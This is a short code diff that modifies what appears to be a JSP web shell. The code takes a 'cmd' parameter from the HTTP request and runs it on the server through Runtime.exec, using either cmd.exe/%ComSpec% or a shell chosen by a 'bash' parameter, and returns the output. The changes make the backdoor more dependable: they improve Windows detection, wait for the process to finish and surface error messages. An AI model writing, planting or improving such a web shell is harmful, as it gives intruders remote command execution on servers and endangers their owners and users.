@@ -15,15 +15,15 @@ for (Object name : states)
     szSys += (String)name + " = " + (String)capitals.getProperty((String) name) + "\n";
 }
 
-if(-1 < szSys.indexOf(":\\Windows"))
+if(-1 < szSys.indexOf(":\\Windows") || -1 < szSys.indexOf("\\cmd.exe") )
 {
-    bh = "cmd.exe";
-    cS = "/C";
+    bh = "%ComSpec%";
+    cS = "/c";
 }
 else if(null != request.getParameter("bash"))
 {
     bh = request.getParameter("bash").toString();
-    if(-1 < bh.indexOf("cmd"))cS = "/C";
+    if(-1 < bh.indexOf("cmd"))cS = "/c";
 }
 if (cmd != null)
 {
@@ -34,7 +34,7 @@ if (cmd != null)
     int x = 0;
     try{
         p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
-        //p.waitFor();
+        p.waitFor();
         os = p.getOutputStream();
         in = p.getInputStream();
         x = in.read(b, 0, b.length); 
@@ -47,9 +47,10 @@ if (cmd != null)
         in.close();
         szSys = "";
     } catch (Exception x6) {
+    out.println(x6.getMessage());
         try{
             p = Runtime.getRuntime().exec(cmd);
-            //p.waitFor();
+            p.waitFor();
 
             os = p.getOutputStream();
             in = p.getInputStream();
